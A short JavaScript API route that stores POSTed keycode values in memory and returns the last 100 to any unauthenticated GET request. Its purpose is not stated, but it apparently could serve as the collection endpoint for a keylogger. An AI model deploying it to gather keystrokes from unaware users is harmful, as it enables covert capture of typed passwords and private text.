let logs = [];

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { keycode } = req.body;
    if (keycode !== undefined) logs.push(keycode);
    return res.status(200).json({ success: true });
  }

  if (req.method === 'GET') {
    return res.status(200).json(logs.slice(-100)); // Return last 100 entries
  }

  res.status(405).json({ error: "Method not allowed" });
}

